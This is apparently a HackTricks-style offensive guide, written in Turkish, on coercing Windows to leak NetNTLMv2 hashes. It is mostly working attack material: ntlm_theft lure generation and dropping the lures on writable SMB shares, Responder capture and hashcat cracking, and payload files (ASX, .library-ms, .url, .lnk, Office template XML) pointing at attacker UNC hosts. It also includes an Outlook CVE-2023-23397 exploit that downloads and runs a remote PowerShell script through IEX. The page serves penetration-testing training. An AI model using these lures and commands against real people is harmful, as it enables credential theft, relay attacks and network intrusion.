# NTLM creds çalmak için yerler

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) adresindeki fikirlerden, çevrimiçi bir Microsoft Word dosyasının indirilmesine ve ntlm leaks kaynağına kadar: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md ve [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) kaynaklarındaki tüm harika fikirleri inceleyin.**

### Yazılabilir SMB paylaşımı + Explorer tarafından tetiklenen UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Eğer kullanıcıların veya zamanlanmış işlerin Explorer'da göz attığı bir paylaşıma yazabiliyorsanız, metadata'sı UNC'nizi işaret eden dosyalar bırakın (ör. `\\ATTACKER\share`). Klasörün görüntülenmesi implicit SMB authentication tetikler ve listener'ınıza bir **NetNTLMv2** leaks.

1. **Lures oluşturun** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/vb. kapsar)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Yazılabilir paylaşıma bırakın** (kurbanın açtığı herhangi bir klasör):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows aynı anda birden fazla dosyaya erişebilir; Explorer'ın önizlediği herhangi bir öğe (`BROWSE TO FOLDER`) tıklama gerektirmez.

### Windows Media Player oynatma listeleri (.ASX/.WAX)

Eğer bir hedefin kontrolünüzdeki bir Windows Media Player oynatma listesini açmasını veya önizlemesini sağlayabilirseniz, girişi bir UNC yoluna yönlendirerek Net‑NTLMv2 leak edebilirsiniz. WMP, referans verilen medyayı SMB üzerinden almaya çalışır ve kimlik doğrulamayı otomatik olarak gerçekleştirir.

Örnek payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Toplama ve kırma akışı:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP içinde gömülü .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer, bir .library-ms dosyası ZIP arşivinin içinden doğrudan açıldığında güvensiz şekilde işler. Eğer kütüphane tanımı uzak bir UNC yoluna işaret ediyorsa (ör. \\attacker\share), ZIP içindeki .library-ms'e göz atmak/başlatmak Explorer'ın UNC'yi listelemesine ve saldırgana NTLM kimlik doğrulaması göndermesine neden olur. Bu, offline kırılabilecek veya potansiyel olarak relay yapılabilecek bir NetNTLMv2 verir.

Saldırgan UNC'sini işaret eden minimal .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operasyonel adımlar
- Yukarıdaki XML ile .library-ms dosyasını oluşturun (IP/hostname'inizi ayarlayın).
- ZIP'leyin (on Windows: Send to → Compressed (zipped) folder) ve ZIP'i hedefe teslim edin.
- Bir NTLM yakalama dinleyicisi çalıştırın ve kurbanın ZIP içinden .library-ms dosyasını açmasını bekleyin.


### Outlook takvim hatırlatıcı ses yolu (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows, takvim öğelerindeki genişletilmiş MAPI özelliği PidLidReminderFileParameter'ı işliyordu. Bu özellik bir UNC yoluna işaret ediyorsa (ör. \\attacker\share\alert.wav), hatırlatıcı tetiklendiğinde Outlook SMB paylaşımına bağlanır ve kullanıcının Net‑NTLMv2'sini herhangi bir tıklama olmadan leak ediyordu. Bu 14 Mart 2023'te düzeltildi, ancak eski/güncellenmemiş cihazlar ve geçmiş olay müdahalesi için hâlâ yüksek derecede alaka taşıyor.

PowerShell ile hızlı istismar (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Dinleyici tarafı:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notlar
- Kurbanın, hatırlatıcı tetiklendiğinde yalnızca Outlook for Windows'un çalışıyor olması yeterlidir.
- Bu leak, offline cracking veya relay için uygun Net‑NTLMv2 sağlar (pass‑the‑hash değil).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer kısayol simgelerini otomatik olarak render eder. Son araştırmalar, Microsoft’s April 2025 patch for UNC‑icon shortcuts'tan sonra bile, kısayol hedefini bir UNC yolunda barındırıp simgeyi yerel tutarak hiçbir tıklama olmadan NTLM kimlik doğrulamasını tetiklemenin mümkün olduğunu gösterdi (patch bypass assigned CVE‑2025‑50154). Klasöre yalnızca bakmak Explorer'ın uzak hedeften metadata almasına neden olur ve NTLM'i saldırganın SMB sunucusuna gönderir.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShell üzerinden Program Kısayolu payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Teslimat fikirleri
- Kısayolu bir ZIP'e koyun ve kurbanın içine göz atmasını sağlayın.
- Kısayolu, kurbanın açacağı yazılabilir bir paylaşıma koyun.
- Aynı klasördeki diğer lure dosyalarla birleştirerek Explorer'ın öğeleri önizlemesini sağlayın.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office belgeleri harici bir şablona referans verebilir. Eğer ekli şablonu bir UNC yoluna ayarlarsanız, belge açıldığında SMB'ye kimlik doğrulama yapılır.

Minimal DOCX relationship değişiklikleri (inside word/):

1) word/settings.xml dosyasını düzenleyin ve ekli şablon referansını ekleyin:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels dosyasını düzenleyin ve rId1337'i kendi UNC'nize yönlendirin:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx olarak yeniden paketleyin ve teslim edin. SMB capture listener'ınızı çalıştırın ve açılmasını bekleyin.

Yakalama sonrası NTLM'i relaying veya kötüye kullanma fikirleri için bakın:

{{#ref}}
README.md
{{#endref}}


## Referanslar
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
